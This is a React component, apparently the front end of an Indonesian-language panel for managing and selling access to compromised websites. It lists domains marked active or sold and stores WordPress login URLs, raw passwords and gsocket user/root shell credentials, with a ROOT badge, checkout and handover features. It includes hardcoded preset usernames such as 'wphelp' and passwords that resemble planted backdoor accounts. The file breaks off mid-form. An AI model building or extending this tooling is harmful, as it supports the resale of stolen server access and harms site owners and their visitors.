import React, { useState, useEffect, useCallback } from 'react';
import { Search, RefreshCw, ExternalLink, Copy, Activity, FileText, ChevronLeft, ChevronRight, Filter, ArrowUpDown, ShieldCheck, Trash2, Plus, Edit2, X, Check, Globe, Bookmark, Sparkles } from 'lucide-react';
import { useToast } from './Toast';
import { HandoverModal } from './HandoverModal';
import { CheckoutModal } from './CheckoutModal';
import { IngestionModal } from './IngestionModal';
import { MultiSelectFloatingBar } from './MultiSelectFloatingBar';
import { CustomSelect, type SelectOption } from './CustomSelect';
import { StatsCards } from './StatsCards';

const endpointStatusOptions: SelectOption[] = [
  { value: 'all', label: 'Endpoint: Semua' },
  { value: 'active', label: 'Endpoint Live', badge: '2xx/3xx', badgeColor: 'bg-emerald-100 text-emerald-800 border border-emerald-200' },
  { value: 'inactive', label: 'Dead / Unchecked', badge: '4xx/5xx', badgeColor: 'bg-rose-100 text-rose-800 border border-rose-200' },
];

const sortOptions: SelectOption[] = [
  { value: 'created_at_desc', label: 'Urutkan: Terbaru' },
  { value: 'created_at_asc', label: 'Urutkan: Terlama' },
  { value: 'domain_asc', label: 'Urutkan: Domain (A-Z)' },
  { value: 'updated_at_desc', label: 'Urutkan: Terakhir Update' },
];

const DEFAULT_USER_TEMPLATES = ['wphelp', 'admin'];
const DEFAULT_PASS_TEMPLATES = ['SMAX@inhere1337', 'KucingLiar1337909'];

export const Datatable: React.FC<{ initialPage?: number }> = () => {
  const { showToast } = useToast();

  // Query state
  const [page, setPage] = useState(1);
  const [limit, setLimit] = useState(10);
  const [search, setSearch] = useState('');
  const [status, setStatus] = useState('all'); // 'all' | 'active' | 'sold'
  const [endpointStatus, setEndpointStatus] = useState('all');
  const [sortKey, setSortKey] = useState('created_at_desc');

  // Dynamic User/Pass Template Chips stored in localStorage
  const [userTemplates, setUserTemplates] = useState<string[]>(DEFAULT_USER_TEMPLATES);
  const [passTemplates, setPassTemplates] = useState<string[]>(DEFAULT_PASS_TEMPLATES);

  useEffect(() => {
    if (typeof window !== 'undefined') {
      try {
        const uRaw = localStorage.getItem('sh_user_tpls_v2');
        const pRaw = localStorage.getItem('sh_pass_tpls_v2');
        if (uRaw) setUserTemplates(JSON.parse(uRaw));
        if (pRaw) setPassTemplates(JSON.parse(pRaw));
      } catch (err) {
        console.error('Failed to parse saved templates:', err);
      }
    }
  }, []);

  const handleAddUserTemplate = () => {
    const val = prompt('Masukkan template username baru:');
    if (val && val.trim()) {
      const trimmed = val.trim();
      if (!userTemplates.includes(trimmed)) {
        const updated = [...userTemplates, trimmed];
        setUserTemplates(updated);
        if (typeof window !== 'undefined') {
          localStorage.setItem('sh_user_tpls_v2', JSON.stringify(updated));
        }
        showToast(`Template username '${trimmed}' ditambahkan!`, 'success');
      }
    }
  };

  const handleRemoveUserTemplate = (tpl: string, e: React.MouseEvent) => {
    e.stopPropagation();
    const updated = userTemplates.filter((t) => t !== tpl);
    setUserTemplates(updated);
    if (typeof window !== 'undefined') {
      localStorage.setItem('sh_user_tpls_v2', JSON.stringify(updated));
    }
    showToast(`Template username '${tpl}' dihapus.`, 'info');
  };

  const handleAddPassTemplate = () => {
    const val = prompt('Masukkan template password baru:');
    if (val && val.trim()) {
      const trimmed = val.trim();
      if (!passTemplates.includes(trimmed)) {
        const updated = [...passTemplates, trimmed];
        setPassTemplates(updated);
        if (typeof window !== 'undefined') {
          localStorage.setItem('sh_pass_tpls_v2', JSON.stringify(updated));
        }
        showToast(`Template password '${trimmed}' ditambahkan!`, 'success');
      }
    }
  };

  const handleRemovePassTemplate = (tpl: string, e: React.MouseEvent) => {
    e.stopPropagation();
    const updated = passTemplates.filter((t) => t !== tpl);
    setPassTemplates(updated);
    if (typeof window !== 'undefined') {
      localStorage.setItem('sh_pass_tpls_v2', JSON.stringify(updated));
    }
    showToast(`Template password '${tpl}' dihapus.`, 'info');
  };

  // Parse sortKey into sort and order
  const getSortOrder = (key: string) => {
    switch (key) {
      case 'created_at_asc':
        return { sort: 'created_at', order: 'asc' };
      case 'domain_asc':
        return { sort: 'domain', order: 'asc' };
      case 'updated_at_desc':
        return { sort: 'updated_at', order: 'desc' };
      case 'created_at_desc':
      default:
        return { sort: 'created_at', order: 'desc' };
    }
  };

  // Stats & Data state
  const [stats, setStats] = useState({ total: 0, active: 0, sold: 0, primary_off: 0 });
  const [items, setItems] = useState<any[]>([]);
  const [pagination, setPagination] = useState({ page: 1, limit: 10, total_items: 0, total_pages: 1 });
  const [loading, setLoading] = useState(false);
  const [liveCheckingId, setLiveCheckingId] = useState<string | null>(null);

  // Multi-select state
  const [selectedMap, setSelectedMap] = useState<Record<string, { id: string; domain: string }>>({});

  // Split Pane Selected Row State
  const [selectedRowId, setSelectedRowId] = useState<string | null>(null);
  const [detailCache, setDetailCache] = useState<Record<string, { loading: boolean; data: any }>>({});
  const [newEndpointUrl, setNewEndpointUrl] = useState('');
  const [addingEp, setAddingEp] = useState(false);

  // Inline Edit Mode State for Right Pane
  const [isEditingRightPane, setIsEditingRightPane] = useState(false);
  const [editForm, setEditForm] = useState({
    login_url: '',
    email: '',
    login_user: '',
    login_password: '',
    gsocket_user: '',
    gsocket_root: '',
  });
  const [savingEdit, setSavingEdit] = useState(false);

  // Modals state
  const [isIngestOpen, setIsIngestOpen] = useState(false);
  const [isCheckoutOpen, setIsCheckoutOpen] = useState(false);
  const [isHandoverOpen, setIsHandoverOpen] = useState(false);
  const [handoverDomains, setHandoverDomains] = useState<{ id: string; domain: string }[]>([]);

  const fetchData = useCallback(async () => {
    setLoading(true);
    try {
      const { sort, order } = getSortOrder(sortKey);
      const q = new URLSearchParams({
        page: page.toString(),
        limit: limit.toString(),
        search,
        status,
        endpoint_status: endpointStatus,
        sort,
        order,
      });

      const res = await fetch(`/api/websites?${q.toString()}`);
      const json = await res.json();
      if (res.ok && json.success) {
        setItems(json.data);
        setPagination(json.pagination);
        if (json.stats) {
          setStats(json.stats);
        }
        // Auto-select first item if no item selected yet on desktop
        if (json.data.length > 0 && !selectedRowId && typeof window !== 'undefined' && window.innerWidth >= 1024) {
          setSelectedRowId(json.data[0].id);
          fetchRowDetail(json.data[0].id);
        }
      }
    } catch (err) {
      console.error('Fetch error:', err);
      showToast('Gagal memuat daftar website.', 'error');
    } finally {
      setLoading(false);
    }
  }, [page, limit, search, status, endpointStatus, sortKey, selectedRowId]);

  useEffect(() => {
    fetchData();
  }, [fetchData]);

  // Fetch detail for right pane
  const fetchRowDetail = async (websiteId: string) => {
    setDetailCache((prev) => ({
      ...prev,
      [websiteId]: { ...prev[websiteId], loading: true },
    }));

    try {
      const res = await fetch(`/api/websites/${websiteId}`);
      const json = await res.json();
      if (res.ok && json.success) {
        setDetailCache((prev) => ({
          ...prev,
          [websiteId]: { loading: false, data: json.data },
        }));
      }
    } catch {
      showToast('Gagal mengambil detail domain.', 'error');
    }
  };

  const handleSelectRow = (websiteId: string) => {
    setSelectedRowId(websiteId);
    setIsEditingRightPane(false);
    if (!detailCache[websiteId]) {
      fetchRowDetail(websiteId);
    }
  };

  // Start edit in right pane
  const handleStartEditRightPane = (row: any) => {
    if (row.status === 'sold') {
      showToast('Domain yang sudah terjual dilarang di-edit!', 'error');
      return;
    }

    setIsEditingRightPane(true);
    const cacheData = detailCache[row.id]?.data;
    setEditForm({
      login_url: row.login_url || cacheData?.login_url || '',
      email: cacheData?.email || '',
      login_user: row.login_user || cacheData?.login_user || '',
      login_password: cacheData?.credentials?.login_password || '',
      gsocket_user: cacheData?.credentials?.gsocket_user || '',
      gsocket_root: cacheData?.credentials?.gsocket_root || '',
    });
  };

  // Apply Login URL Template
  const handleApplyUrlTemplate = (path: string) => {
    const domain = activeSelectedRow?.domain || '';
    const cleanDomain = domain.replace(/^https?:\/\//, '').replace(/\/$/, '');
    if (!cleanDomain) {
      showToast('Nama domain tidak ditemukan.', 'error');
      return;
    }
    const generatedUrl = `https://${cleanDomain}${path.startsWith('/') ? path : '/' + path}`;
    setEditForm((prev) => ({ ...prev, login_url: generatedUrl }));
    showToast(`Template URL '${path}' diterapkan!`, 'info');
  };

  // Submit edit form in right pane
  const handleSaveEditRightPane = async (websiteId: string) => {
    setSavingEdit(true);
    try {
      const res = await fetch(`/api/websites/${websiteId}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(editForm),
      });

      const json = await res.json();
      if (res.ok && json.success) {
        showToast('Data website berhasil diperbarui!', 'success');
        setIsEditingRightPane(false);
        fetchRowDetail(websiteId);
        fetchData();
      } else {
        showToast(json.error?.message || 'Gagal menyimpan perubahan.', 'error');
      }
    } catch {
      showToast('Gangguan jaringan.', 'error');
    } finally {
      setSavingEdit(false);
    }
  };

  // Checkbox handlers
  const toggleSelectRow = (id: string, domain: string) => {
    setSelectedMap((prev) => {
      const next = { ...prev };
      if (next[id]) delete next[id];
      else next[id] = { id, domain };
      return next;
    });
  };

  const toggleSelectAllPage = () => {
    const allSelected = items.every((it) => Boolean(selectedMap[it.id]));
    if (allSelected) {
      setSelectedMap((prev) => {
        const next = { ...prev };
        items.forEach((it) => delete next[it.id]);
        return next;
      });
    } else {
      setSelectedMap((prev) => {
        const next = { ...prev };
        items.forEach((it) => {
          next[it.id] = { id: it.id, domain: it.domain };
        });
        return next;
      });
    }
  };

  // Multi-select bulk copy handlers
  const handleCopySelectedDomains = () => {
    const selectedList = Object.values(selectedMap);
    if (selectedList.length === 0) return;
    const text = selectedList.map((item) => item.domain).join('\n');
    navigator.clipboard.writeText(text);
    showToast(`${selectedList.length} Nama Domain disalin ke clipboard!`, 'success');
  };

  const handleCopySelectedUrls = () => {
    const selectedList = Object.values(selectedMap);
    if (selectedList.length === 0) return;
    const urls = selectedList.map((item) => {
      const d = item.domain.trim();
      return d.startsWith('http://') || d.startsWith('https://') ? d : `https://${d}`;
    });
    navigator.clipboard.writeText(urls.join('\n'));
    showToast(`${selectedList.length} Domain URL (https://) disalin ke clipboard!`, 'success');
  };

  const handleCopySelectedEndpoints = () => {
    const selectedList = Object.values(selectedMap);
    if (selectedList.length === 0) return;

    const endpointUrls: string[] = [];
    selectedList.forEach((sel) => {
      const row = items.find((it) => it.id === sel.id);
      if (row?.primary_endpoint?.url) {
        endpointUrls.push(row.primary_endpoint.url);
      }
    });

    if (endpointUrls.length === 0) {
      showToast('Tidak ada primary endpoint pada domain terpilih.', 'error');
      return;
    }

    navigator.clipboard.writeText(endpointUrls.join('\n'));
    showToast(`${endpointUrls.length} Primary Endpoint URL disalin ke clipboard!`, 'success');
  };

  // Actions
  const handleLiveCheck = async (websiteId: string, domainName: string) => {
    setLiveCheckingId(websiteId);
    showToast(`Memulai health check untuk '${domainName}'...`, 'info');
    try {
      const res = await fetch('/api/websites/live-check', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ website_id: websiteId }),
      });
      const json = await res.json();
      if (res.ok && json.success) {
        showToast(`Health check '${domainName}' selesai! (${json.data.total_checked} endpoint diperbarui)`, 'success');
        fetchData();
        if (selectedRowId === websiteId) {
          fetchRowDetail(websiteId);
        }
      } else {
        showToast(json.error?.message || 'Gagal memeriksa endpoint.', 'error');
      }
    } catch {
      showToast('Gangguan jaringan saat live check.', 'error');
    } finally {
      setLiveCheckingId(null);
    }
  };

  const handleAddEndpointInline = async (e: React.FormEvent, websiteId: string) => {
    e.preventDefault();
    if (!newEndpointUrl.trim()) return;
    setAddingEp(true);
    try {
      const res = await fetch('/api/endpoints', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ website_id: websiteId, url: newEndpointUrl.trim() }),
      });
      const json = await res.json();
      if (res.ok && json.success) {
        showToast('Endpoint baru berhasil ditambahkan!', 'success');
        setNewEndpointUrl('');
        fetchRowDetail(websiteId);
        fetchData();
      } else {
        showToast(json.error?.message || 'Gagal menambah endpoint.', 'error');
      }
    } catch {
      showToast('Gangguan jaringan.', 'error');
    } finally {
      setAddingEp(false);
    }
  };

  const handleSetPrimaryInline = async (endpointId: string, websiteId: string) => {
    try {
      const res = await fetch(`/api/endpoints/${endpointId}`, { method: 'PUT' });
      const json = await res.json();
      if (res.ok && json.success) {
        showToast('Endpoint primary diperbarui!', 'success');
        fetchRowDetail(websiteId);
        fetchData();
      }
    } catch {
      showToast('Gagal mengubah primary endpoint.', 'error');
    }
  };

  const handleDeleteEndpointInline = async (endpointId: string, websiteId: string) => {
    if (!confirm('Apakah Anda yakin ingin menghapus endpoint ini?')) return;
    try {
      const res = await fetch(`/api/endpoints/${endpointId}`, { method: 'DELETE' });
      const json = await res.json();
      if (res.ok && json.success) {
        showToast('Endpoint berhasil dihapus!', 'success');
        fetchRowDetail(websiteId);
        fetchData();
      }
    } catch {
      showToast('Gagal menghapus endpoint.', 'error');
    }
  };

  const handleDeleteWebsite = async (websiteId: string, domainName: string, status: string) => {
    if (status === 'sold') {
      showToast('Domain yang sudah terjual dilarang dihapus!', 'error');
      return;
    }
    if (!confirm(`Hapus domain ${domainName} beserta seluruh endpoint-nya?`)) return;

    try {
      const res = await fetch(`/api/websites/${websiteId}`, { method: 'DELETE' });
      const json = await res.json();
      if (res.ok && json.success) {
        showToast(`Website '${domainName}' telah dihapus.`, 'success');
        if (selectedRowId === websiteId) setSelectedRowId(null);
        fetchData();
      } else {
        showToast(json.error?.message || 'Gagal menghapus website.', 'error');
      }
    } catch {
      showToast('Gangguan jaringan.', 'error');
    }
  };

  const copyToClipboard = (text: string | null | undefined, label: string) => {
    if (!text || text === 'UNRESOLVED' || text === '-') return;
    navigator.clipboard.writeText(text);
    showToast(`${label} disalin ke clipboard!`, 'info');
  };

  const selectedList = Object.values(selectedMap);
  const activeSelectedRow = items.find(it => it.id === selectedRowId);
  const activeDetailCache = selectedRowId ? detailCache[selectedRowId] : null;

  return (
    <div className="space-y-6 pb-16">
      {/* Overview Stats Cards */}
      <StatsCards stats={stats} />

      {/* Search & Custom Filter Header Bar */}
      <div className="bg-white border border-slate-200 rounded-2xl p-4 sm:p-5 shadow-sm space-y-4">
        <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3">
          
          {/* Search Box */}
          <div className="relative flex-1">
            <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
              <Search className="w-4 h-4" />
            </div>
            <input
              type="text"
              value={search}
              onChange={(e) => {
                setSearch(e.target.value);
                setPage(1);
              }}
              placeholder="Cari domain, IP address, atau username..."
              className="w-full pl-10 pr-4 py-2.5 bg-slate-50 border border-slate-300 rounded-xl text-slate-900 placeholder-slate-400 text-sm focus:outline-none focus:ring-2 focus:ring-indigo-600 focus:bg-white transition-all"
            />
          </div>

          <div className="flex flex-wrap items-center gap-2 sm:gap-3">
            
            {/* Status Filter Segmented Pill Buttons (Semua | Active | Sold) */}
            <div className="bg-slate-100 p-1 rounded-xl border border-slate-200 flex items-center space-x-1">
              <button
                type="button"
                onClick={() => {
                  setStatus('all');
                  setPage(1);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all ${
                  status === 'all'
                    ? 'bg-white text-indigo-600 shadow-xs border border-slate-200'
                    : 'text-slate-600 hover:text-slate-900'
                }`}
              >
                Semua
              </button>

              <button
                type="button"
                onClick={() => {
                  setStatus('active');
                  setPage(1);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all ${
                  status === 'active'
                    ? 'bg-emerald-600 text-white shadow-xs'
                    : 'text-slate-600 hover:text-slate-900'
                }`}
              >
                Active
              </button>

              <button
                type="button"
                onClick={() => {
                  setStatus('sold');
                  setPage(1);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all ${
                  status === 'sold'
                    ? 'bg-amber-600 text-white shadow-xs'
                    : 'text-slate-600 hover:text-slate-900'
                }`}
              >
                Sold
              </button>
            </div>

            {/* Endpoint Status Filter */}
            <CustomSelect
              options={endpointStatusOptions}
              value={endpointStatus}
              onChange={(val) => {
                setEndpointStatus(val);
                setPage(1);
              }}
              icon={<Activity className="w-3.5 h-3.5" />}
            />

            {/* Sorting Dropdown (Terbaru, Terlama, Domain A-Z, Terakhir Update) */}
            <CustomSelect
              options={sortOptions}
              value={sortKey}
              onChange={(val) => {
                setSortKey(val);
                setPage(1);
              }}
              icon={<ArrowUpDown className="w-3.5 h-3.5" />}
            />

            <button
              onClick={() => fetchData()}
              disabled={loading}
              className="p-2.5 bg-slate-100 hover:bg-slate-200 active:bg-slate-300/60 text-slate-700 rounded-xl transition-all border border-slate-300 shadow-xs"
              title="Refresh Data"
            >
              <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
            </button>
          </div>
        </div>
      </div>

      {/* Main Split Pane Layout */}
      <div className="grid grid-cols-12 gap-6 items-start">
        
        {/* LEFT PANE: Datatable List */}
        <div className="col-span-12 lg:col-span-7 bg-white border border-slate-200 rounded-2xl shadow-sm overflow-hidden flex flex-col">
          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="bg-slate-50/80 border-b border-slate-200 text-xs font-bold text-slate-500 uppercase tracking-wider">
                  <th className="p-3.5 w-10 text-center">
                    <input
                      type="checkbox"
                      checked={items.length > 0 && items.every((it) => Boolean(selectedMap[it.id]))}
                      onChange={toggleSelectAllPage}
                      className="w-4 h-4 text-indigo-600 rounded border-slate-300 focus:ring-indigo-500 cursor-pointer"
                    />
                  </th>
                  <th className="p-3.5">Domain Name</th>
                  <th className="p-3.5">Primary Endpoint</th>
                  <th className="p-3.5 text-right">Actions</th>
                </tr>
              </thead>

              <tbody className="divide-y divide-slate-100 text-sm">
                {loading && items.length === 0 ? (
                  <tr>
                    <td colSpan={4} className="p-12 text-center text-slate-400">
                      <div className="inline-flex items-center space-x-2">
                        <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-indigo-600"></div>
                        <span>Memuat inventaris domain...</span>
                      </div>
                    </td>
                  </tr>
                ) : items.length === 0 ? (
                  <tr>
                    <td colSpan={4} className="p-12 text-center text-slate-500">
                      Tidak ada domain yang ditemukan.
                    </td>
                  </tr>
                ) : (
                  items.map((row) => {
                    const isCheckSelected = Boolean(selectedMap[row.id]);
                    const isPaneSelected = selectedRowId === row.id;
                    const ep = row.primary_endpoint;

                    return (
                      <tr
                        key={row.id}
                        onClick={() => handleSelectRow(row.id)}
                        className={`cursor-pointer transition-colors ${
                          isPaneSelected
                            ? 'bg-indigo-50/80 border-l-4 border-indigo-600'
                            : isCheckSelected
                            ? 'bg-indigo-50/30'
                            : 'hover:bg-slate-50/90'
                        }`}
                      >
                        <td className="p-3.5 text-center" onClick={(e) => e.stopPropagation()}>
                          <input
                            type="checkbox"
                            checked={isCheckSelected}
                            onChange={() => toggleSelectRow(row.id, row.domain)}
                            className="w-4 h-4 text-indigo-600 rounded border-slate-300 focus:ring-indigo-500 cursor-pointer"
                          />
                        </td>

                        <td className="p-3.5">
                          <div className="flex flex-wrap items-center gap-1.5">
                            <span className="font-bold text-slate-900 truncate max-w-[150px] sm:max-w-[180px]">
                              {row.domain}
                            </span>

                            <span
                              className={`px-1.5 py-0.2 rounded-full text-[9px] font-bold ${
                                row.status === 'sold'
                                  ? 'bg-amber-100 text-amber-800 border border-amber-200'
                                  : 'bg-emerald-100 text-emerald-800 border border-emerald-200'
                              }`}
                            >
                              {row.status === 'sold' ? 'SOLD' : 'ACTIVE'}
                            </span>

                            {/* Red ROOT Badge Label */}
                            {row.has_gsocket_root && (
                              <span className="px-1.5 py-0.2 rounded-full text-[9px] font-black bg-rose-100 text-rose-800 border border-rose-200 shadow-2xs">
                                ROOT
                              </span>
                            )}
                          </div>
                          {row.login_user && (
                            <div className="text-[11px] text-slate-400 mt-0.5">User: {row.login_user}</div>
                          )}
                        </td>

                        <td className="p-3.5">
                          {ep ? (
                            <div className="flex items-center space-x-1.5">
                              <span
                                className={`px-1.5 py-0.2 rounded text-[10px] font-bold shrink-0 ${
                                  ep.status_code >= 200 && ep.status_code < 300
                                    ? 'bg-emerald-100 text-emerald-800'
                                    : ep.status_code >= 300 && ep.status_code < 400
                                    ? 'bg-sky-100 text-sky-800'
                                    : ep.status_code === 401 || ep.status_code === 403
                                    ? 'bg-amber-100 text-amber-800'
                                    : ep.status_code >= 400
                                    ? 'bg-rose-100 text-rose-800'
                                    : 'bg-slate-100 text-slate-600'
                                }`}
                              >
                                {ep.status_code ? `HTTP ${ep.status_code}` : ep.is_active ? 'LIVE' : 'UNCHECKED'}
                              </span>
                              <span className="font-mono text-xs text-slate-600 truncate max-w-[140px]">
                                {ep.url}
                              </span>
                            </div>
                          ) : (
                            <span className="text-xs text-slate-400">-</span>
                          )}
                        </td>

                        <td className="p-3.5 text-right" onClick={(e) => e.stopPropagation()}>
                          <div className="flex items-center justify-end space-x-1">
                            <button
                              onClick={() => handleStartEditRightPane(row)}
                              className="p-1.5 text-slate-600 hover:text-indigo-600 hover:bg-indigo-50 rounded-xl transition-all"
                              title="Edit Website"
                            >
                              <Edit2 className="w-3.5 h-3.5" />
                            </button>

                            <button
                              onClick={() => handleDeleteWebsite(row.id, row.domain, row.status)}
                              className="p-1.5 text-slate-600 hover:text-rose-600 hover:bg-rose-50 rounded-xl transition-all"
                              title="Hapus Website"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                            </button>
                          </div>
                        </td>
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>

          {/* Left Table Pagination Footer */}
          <div className="px-5 py-3.5 border-t border-slate-200 bg-slate-50/50 flex items-center justify-between text-xs text-slate-500 mt-auto">
            <div>
              {items.length} dari {pagination.total_items} domain
            </div>

            <div className="flex items-center space-x-1.5">
              <button
                onClick={() => setPage((p) => Math.max(1, p - 1))}
                disabled={page <= 1}
                className="p-1.5 bg-white border border-slate-200 hover:bg-slate-100 disabled:opacity-40 rounded-xl transition-all"
              >
                <ChevronLeft className="w-3.5 h-3.5" />
              </button>
              <span className="font-semibold text-slate-700">
                {page}/{pagination.total_pages}
              </span>
              <button
                onClick={() => setPage((p) => Math.min(pagination.total_pages, p + 1))}
                disabled={page >= pagination.total_pages}
                className="p-1.5 bg-white border border-slate-200 hover:bg-slate-100 disabled:opacity-40 rounded-xl transition-all"
              >
                <ChevronRight className="w-3.5 h-3.5" />
              </button>
            </div>
          </div>
        </div>

        {/* RIGHT PANE: Persistent Detail View */}
        <div className="col-span-12 lg:col-span-5 lg:sticky lg:top-20 max-h-[calc(100vh-6rem)] overflow-y-auto">
          {activeSelectedRow ? (
            <div className="bg-white border border-slate-200 rounded-2xl shadow-sm p-5 space-y-5">
              
              {/* Right Pane Header */}
              <div className="flex items-center justify-between pb-3 border-b border-slate-200">
                <div className="flex items-center space-x-2.5 min-w-0">
                  <div className="w-9 h-9 rounded-xl bg-indigo-50 text-indigo-600 flex items-center justify-center border border-indigo-100 shrink-0">
                    <Globe className="w-4.5 h-4.5" />
                  </div>
                  <div className="min-w-0">
                    <h3 className="font-bold text-slate-900 text-base truncate leading-tight">
                      {activeSelectedRow.domain}
                    </h3>
                    <div className="flex items-center space-x-1.5 mt-0.5">
                      <span className={`px-2 py-0.2 rounded text-[10px] font-bold ${activeSelectedRow.status === 'sold' ? 'bg-amber-100 text-amber-800' : 'bg-emerald-100 text-emerald-800'}`}>
                        {activeSelectedRow.status.toUpperCase()}
                      </span>

                      {/* Red ROOT Badge Label in Detail Pane */}
                      {activeDetailCache?.data?.credentials?.gsocket_root && (
                        <span className="px-2 py-0.2 rounded text-[10px] font-black bg-rose-100 text-rose-800 border border-rose-200">
                          ROOT
                        </span>
                      )}

                      <button
                        onClick={() => copyToClipboard(activeSelectedRow.domain, 'Domain Name')}
                        className="text-slate-400 hover:text-indigo-600 text-xs flex items-center space-x-1 ml-1"
                      >
                        <Copy className="w-3 h-3" />
                        <span>Copy</span>
                      </button>
                    </div>
                  </div>
                </div>

                <button
                  onClick={() => setSelectedRowId(null)}
                  className="p-1.5 text-slate-400 hover:text-slate-700 hover:bg-slate-100 rounded-xl transition-colors shrink-0"
                  title="Tutup Detail Pane"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>

              {/* Quick Action Toolbar inside Right Pane */}
              <div className="flex flex-wrap items-center gap-2">
                {activeSelectedRow.status !== 'sold' && (
                  <button
                    onClick={() => handleLiveCheck(activeSelectedRow.id, activeSelectedRow.domain)}
                    disabled={liveCheckingId === activeSelectedRow.id}
                    className="px-3 py-1.5 bg-indigo-50 hover:bg-indigo-100 text-indigo-700 rounded-xl text-xs font-semibold flex items-center space-x-1.5 transition-all"
                  >
                    <Activity className={`w-3.5 h-3.5 ${liveCheckingId === activeSelectedRow.id ? 'animate-spin text-indigo-600' : ''}`} />
                    <span>Live Check</span>
                  </button>
                )}

                <button
                  onClick={() => {
                    setHandoverDomains([{ id: activeSelectedRow.id, domain: activeSelectedRow.domain }]);
                    setIsHandoverOpen(true);
                  }}
                  className="px-3 py-1.5 bg-slate-100 hover:bg-slate-200 text-slate-800 rounded-xl text-xs font-semibold flex items-center space-x-1.5 transition-all"
                >
                  <FileText className="w-3.5 h-3.5 text-slate-600" />
                  <span>Format Handover</span>
                </button>

                {!isEditingRightPane ? (
                  <button
                    onClick={() => handleStartEditRightPane(activeSelectedRow)}
                    className="px-3 py-1.5 bg-indigo-600 text-white hover:bg-indigo-700 rounded-xl text-xs font-bold flex items-center space-x-1.5 shadow-sm"
                  >
                    <Edit2 className="w-3.5 h-3.5" />
                    <span>Edit Domain</span>
                  </button>
                ) : (
                  <button
                    onClick={() => setIsEditingRightPane(false)}
                    className="px-3 py-1.5 bg-slate-200 text-slate-700 rounded-xl text-xs font-semibold flex items-center space-x-1"
                  >
                    <X className="w-3.5 h-3.5" />
                    <span>Batal Edit</span>
                  </button>
                )}
              </div>

              {/* Right Pane Body View */}
              {activeDetailCache?.loading ? (
                <div className="py-12 text-center text-slate-400">
                  <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-indigo-600 mx-auto mb-2"></div>
                  <span className="text-xs">Memuat detail {activeSelectedRow.domain}...</span>
                </div>
              ) : activeDetailCache?.data ? (
                <div className="space-y-4">
                  {isEditingRightPane ? (
                    /* Inline Edit Form in Right Pane with Template Shortcuts for URL, User, and Pass */
                    <div className="space-y-4 bg-slate-50/80 p-4 border border-indigo-200 rounded-2xl text-xs shadow-xs">
                      <div className="flex items-center justify-between border-b border-slate-200 pb-2">
                        <div className="font-bold text-slate-900 flex items-center space-x-1.5 text-sm">
                          <Sparkles className="w-4 h-4 text-indigo-600" />
                          <span>Form Edit Data Domain</span>
                        </div>
                      </div>

                      {/* Login URL Input + WP Login Template Shortcut Buttons */}
                      <div>
                        <div className="flex flex-wrap items-center justify-between gap-1 mb-1">
                          <label className="block text-slate-700 font-bold">Login URL</label>
                          <div className="flex flex-wrap items-center gap-1">
                            <button
                              type="button"
                              onClick={() => handleApplyUrlTemplate('/wp-login.php')}
                              className="px-2 py-0.5 bg-indigo-50 hover:bg-indigo-100 text-indigo-700 border border-indigo-200 rounded text-[10px] font-bold"
                              title="Terapkan /wp-login.php"
                            >
                              + /wp-login.php
                            </button>
                            <button
                              type="button"
                              onClick={() => handleApplyUrlTemplate('/wp-admin/')}
                              className="px-2 py-0.5 bg-indigo-50 hover:bg-indigo-100 text-indigo-700 border border-indigo-200 rounded text-[10px] font-bold"
                              title="Terapkan /wp-admin/"
                            >
                              + /wp-admin/
                            </button>
                            <button
                              type="button"
                              onClick={() => handleApplyUrlTemplate('/login.php')}
                              className="px-2 py-0.5 bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-300 rounded text-[10px] font-bold"
                              title="Terapkan /login.php"
                            >
                              + /login.php
                            </button>
                          </div>
                        </div>

                        <input
                          type="text"
                          value={editForm.login_url}
                          onChange={(e) => setEditForm({ ...editForm, login_url: e.target.value })}
                          placeholder="https://example.com/wp-login.php"
                          className="w-full p-2 bg-white border border-slate-300 rounded-xl text-slate-900 font-mono focus:ring-2 focus:ring-indigo-600 focus:outline-none"
                        />
                      </div>

                      {/* Username Login Input + Dynamic Preset Template Chips (Add & Remove) */}
                      <div>
                        <div className="flex flex-wrap items-center justify-between gap-1 mb-1">
                          <label className="block text-slate-700 font-bold">Username Login</label>
                          <div className="flex flex-wrap items-center gap-1">
                            {userTemplates.map((tpl) => (
                              <div
                                key={tpl}
                                className="inline-flex items-center space-x-1 px-2 py-0.5 bg-emerald-50 text-emerald-800 border border-emerald-200 rounded text-[10px] font-bold"
                              >
                                <button
                                  type="button"
                                  onClick={() => setEditForm((prev) => ({ ...prev, login_user: tpl }))}
                                  className="hover:underline font-mono"
                                >
                                  {tpl}
                                </button>
                                <button
                                  type="button"
                                  onClick={(e) => handleRemoveUserTemplate(tpl, e)}
                                  className="text-emerald-500 hover:text-rose-600 ml-0.5"
                                  title={`Hapus template username '${tpl}'`}
                                >
                                  ×
                                </button>
                              </div>
                            ))}

                            <button
                              type="button"
                              onClick={handleAddUserTemplate}
                              className="px-2 py-0.5 bg-indigo-50 hover:bg-indigo-100 text-indigo-700 border border-indigo-200 rounded text-[10px] font-bold flex items-center space-x-0.5"
                              title="Tambah Template Username Baru"
                            >
                              <Plus className="w-3 h-3" />
                              <span>Tambah</span>
                            </button>
                          </div>
                        </div>
                        <input
                          type="text"
                          value={editForm.login_user}
                          onChange={(e) => setEditForm({ ...editForm, login_user: e.target.value })}
                          placeholder="Kosongkan atau pilih template di atas"
                          className="w-full p-2 bg-white border border-slate-300 rounded-xl text-slate-900 focus:ring-2 focus:ring-indigo-600 focus:outline-none"
                        />
                      </div>

                      {/* Password Login Input + Dynamic Preset Template Chips (Add & Remove) */}
                      <div>
                        <div className="flex flex-wrap items-center justify-between gap-1 mb-1">
                          <label className="block text-slate-700 font-bold">Password Login (RAW)</label>
